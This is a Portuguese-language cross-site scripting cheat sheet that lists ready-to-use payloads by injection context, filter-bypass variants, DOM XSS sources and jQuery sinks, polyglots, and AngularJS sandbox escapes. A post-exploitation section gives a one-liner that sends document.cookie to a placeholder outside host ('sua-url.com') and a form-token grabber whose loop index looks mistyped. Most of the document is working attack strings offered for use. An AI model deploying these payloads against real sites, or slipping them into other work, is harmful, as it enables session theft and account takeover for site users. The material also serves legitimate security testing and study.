
#### 1. Basic Payload per Contexts

- **HTML Injection (Body)**
	- **Quando Usar?:** Reflexão direta no HTML, fora de qualquer tag.
	- **Payload:** `<img src=1 onerror=alert(1)>`
	- **Por que funciona:** IMG é uma tag HTML5 que permite eventos onload e é menos filtrada que `<script>`, assim como `SVG`, `IFRAME`
- **HTML Injection (Attribute):**
	- **Quando Usar?:** Reflexão dentro de `value="..."`, `class="..."`, etc.
	- **Payload:** `" onmouseover=alert(1) //`
	- **Por que funciona:** Escapa do atributo com aspas e cria um novo atributo de evento.
- **HTML Injection (Dentro de ``href/src/action``)**
	- **Quando Usar?:** Reflexão dentro de um atributo que espera uma URL
	- **Payload:** `javascript:alert(1)`
	- **Por que funciona:** Usa o pseudo-protocolo `javascript:` que o navegador executa ao invés de navegar.
- **Javascript Injection (Dentro de String JS)**
	- **Quando Usar?:** Reflexão dentro de `<script>var x = '...';</script>`
	- **Payload:** `'-alert(1)-'`.
	- **Por que funciona:** Escapa do contexto da string JS para injetar código executável.

#### 2. Bypass de Filtros Comuns

- **Filtro: Bloqueio de `<script>`, `onerror` e `onload`**
	- **Técnica:** Use ofuscação, casos mistos e tags/eventos menos comuns.
	- **Payload:** `<details open ontoggle=alert(1)>`
	- **Payload:** `<Svg OnLoad=alert(1)>`
	- **Payload:** `<script/x>alert(1)</script>`
	- **Payload:** `<svg/on<script>load=alert(1)` : Se o filtro remove "script", este payload vira `<svg/onload=alert(1)>`
	- **Payload:** `<svg><set onbegin=alert(1)>`.
	- **Payload:** `<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click Me</text/></a>`
	- **Payload:** ``<svg><animateTransform onbegin=alert(1) attributeName="transform" type="rotate" from="0" to="0" dur="1s" />``
- **Filtro: Bloqueio de Parênteses `()`**
	- **Técnica:** Usar acento grave (template literals).
	- **Payload:** ```alert `1` ```
	- **Payload:** `onerror=alert;throw 1`
	- **Payload:** `x=x=>{throw/**/onerror=alert,1},toString=x,window+'',{x:'`
- **Filtro: Bloqueio da palavra "alert"**
	- **Técnica:** Obfuscação e métodos alternativos.
	- **Payload:** `top["al"+"ert"](1)`
	- **Payload:** `(confirm)(1)` (Variação de `alert(1)`).
- **Filtro: Encode de `<` e `>`
	- **Técnica:** Focar em bypass de contexto.
	- **Payload:** `" autofocus onfocus=alert() x="`
	- **Payload:** `" onmouseup="alert()`
- **Filtro: Escape de aspas simples, aspas duplas e barra invertida**
	- **Técnica:** Usar eventos sem aspas ou codificar valores.
	- **Payload:** `onmouseover=alert(1)`
	- **Payload:** `\';alert()//`
	- **Payload:** `&apos;-alert(document.domain)-&apos;`
	- 
#### 3. DOM XSS

- **Fonte Comum:** `location.hash`
	- **Quando Usar?:** Quando o JS da página usa o conteúdo após o `#` da URL.
	- **Técnica:** Inserir HTML no hash, pois ele não é enviado ao servidor e, portanto, não é sanitizado no server-side
	- **Exemplo de URL de Ataque:** `http://alvo.com/page#<img src=x onerror=alert(1)>` 
- **Fonte Comum:** `postMessage()`
	- **Quando Usar?:** Quando uma página usa `window.addEventListener('message', ...)` sem validar a origem.
	- **Técnica:** Criar um `iframe` e enviar uma mensagem maliciosa para a janela pai.
	- **Payload:** `<iframe src=TARGET_URL onload="frames[0].postMessage('INJECTION', '*')">`.
- **Fonte comum:** `attr()`
	- **Quando Usar?:** Quando uma página usa a função `attr()` do Jquery para retornar para uma página
	- **Técnica:** Inserir o payload `javascript:` no lugar do link de retorno.
	- **Payload:** `?returnUrl=javascript:alert(document.domain)`

- **Sinks:**
	- document.write()
	- document.writeln()
	- document.domain
	- element.innerHTML
	- element.outerHTML
	- element.insertAdjacentHTML
	- element;onevent
- **jQuery Sinks**
	- add()
	- after()
	- append()
	- animate()
	- insertAfter()
	- insertBefore()
	- before()
	- html()
	- prepend()
	- replaceAll()
	- replaceWith()
	- wrap()
	- wrapInner()
	- wrapAll()
	- has()
	- constructor()
	- init()
	- index()
	- jQuery.parseHTML()
	- $.parseHTML()

#### 4. Poliglotas e One-Liners Úteis

Aqui não são payloads, mas snippets de JavaScript para quando você já conseguiu a execução;

- **Roubar Cookies:** `fetch('//sua-url.com/?c='+document.cookie)`
- **Roubar Tokens de Forms:** `var f=document.forms;for(i=0;i<f.length;i++){e=f[1].elements;for(n in e){if(e[n].type=='hidden'){alert(e[n].name+':'+e[n].value)}}}`.
- **Poliglota zseano:** `<s>000'")};--//`
	- `<s>`(teste de tag HTML)
	- `"` e `'` (fechamento de atributos)
	- `)` (fechamento de função JS)
	- `};` (fechamento de bloco JS)
	- `--` (comentario SQL)
- **Poliglota de HTML brute lojic:** ```</Script/--><Body/Autofocus/OnFocus = confirm `1```

#### 5. Payloads para Contextos Especificos

- **Dentro de Template Literals JavaScript**
	- **Contexto:** O input reflete dentro de uma string JS delimitada por acentos graves (\`)
	- **Payload:** `${alert(1)}`. Extremamente eficas em frameworks JS modernos.
- **Dentro de Frameworks Especificos:**
	- **Contexto:** A página usa AngularJS.
	- **Payload:** `{{\$new.constructor('alert(1)')()}}` ( para v1.6+)
	- **Payload:** `'a'.constructor.prototype.charAt=[].join` ( para escape sandbox)
	- **Payload:** `[123]|orderBy:expression` (Para caso não possa utilizar $eval)
	- **Payload:** `(true.toString()).constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1` (bypass de filtros, x=alert(1)=1, chama alert(1))
	- Nota: Junte as tecnicas.
- **Contexto de Markdown:**
	- **Quando Usar?:** Em campos de comentário ou descrição que aceitam Markdown.
	- **Payload:** ```[clickme](javascript:alert`1`)```
- **Contexto de XML/SVG**
	- **Quando Usar?:** Quando o `Content-Type` da resposta é `application/xml` ou `text/xml`
	- **Payload:** `<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>`
